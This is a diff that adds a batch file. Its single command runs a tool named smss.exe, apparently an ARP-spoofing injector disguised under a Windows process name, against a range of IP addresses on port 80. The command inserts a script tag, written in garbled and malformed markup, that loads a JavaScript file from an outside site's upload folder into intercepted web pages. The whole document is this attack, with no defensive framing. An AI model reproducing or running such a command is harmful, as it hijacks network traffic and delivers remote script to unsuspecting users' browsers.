@@ -1,0 +1,4 @@
+xxx.bat:
+smss.exe -idx 0 -ip 221.5.250.2-221.5.250.130 -port 80 -insert " < SCRIPT language=javascript src="
+(A href='http://www.forklift-shuangli.com/ccwu/admin/up/flash.js")
+%20(%20/%20script') http://www.forklift-shuangli.com/ccwu/admin/up/flash.js"> < / SCRIPT < A > > " -spoofmode 2
